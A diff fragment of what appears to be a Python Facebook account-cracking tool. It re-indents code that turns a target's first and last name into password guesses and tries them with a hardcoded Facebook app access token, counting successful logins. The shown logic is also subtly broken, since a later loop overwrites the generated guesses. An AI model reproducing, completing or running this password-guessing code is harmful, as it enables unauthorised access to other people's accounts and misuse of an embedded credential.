@@ -567,14 +567,14 @@ class crack_main():
                 global ok
                 sys.stdout.write('\r[ZEE-F] %s / [OK-%s] \r'%(loop,len(ok)));sys.stdout.flush()
                 fn = name.split(' ')[0]
-                        try:
-                                ln = name.split(' ')[1]
-                        except:
-                                ln = fn
-                        fs = first_name.lower()
-                        ls = last_name.lower()        
-                        for pw in passlist:
-                                pas = pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',name).replace('name',name.lower())
+                try:
+                        ln = name.split(' ')[1]
+                except:
+                        ln = fn
+                fs = first_name.lower()
+                ls = last_name.lower()        
+                for pw in passlist:
+                        pas = pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',name).replace('name',name.lower())
                 try:
                         for pas in passlist:
                                 accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
